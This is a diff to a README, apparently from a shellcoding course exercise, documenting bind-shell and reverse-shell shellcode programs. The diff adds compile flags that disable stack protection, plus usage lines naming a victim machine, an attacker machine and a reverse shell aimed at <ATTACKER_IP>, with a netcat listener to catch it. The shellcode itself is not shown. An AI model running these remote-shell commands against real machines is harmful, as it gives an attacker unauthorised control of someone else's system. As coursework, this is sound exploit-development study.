@@ -9,9 +9,12 @@ Create a Shell Bind TCP Shellcode
 - Port number should be easily configurable
 ```
 Implemeted the TCP Bind Shell shellcode 
-Usage example: ./bind_shell <PORT>
+Usage : 
 
-In Victim Machine => ./bindshell 9999 
+=> gcc shellcode_with_configurable_port.c -zexecstack -fno-stack-protector -o bind_shell
+=> ./bind_shell <PORT TO BIND>
+
+In Victim Machine => ./bind_shell 9999 
 
 Attacker Machine => nc 127.0.0.1 9999
 
@@ -24,7 +27,7 @@ Create a Shell Reverse Tcp Shellcode
 - IP and Port should be easily configurable
 ```
 Implemeted the TCP Reverse Shell shellcode 
-Usage example : ./reverse_shell <ATTACKER_IP> <PORT>
+Usage example : ./reverse_shell <ATTACKER_IP> <PORT_TO_BIND>
 
 Attacker Machine => nc -nlvp 8888
 
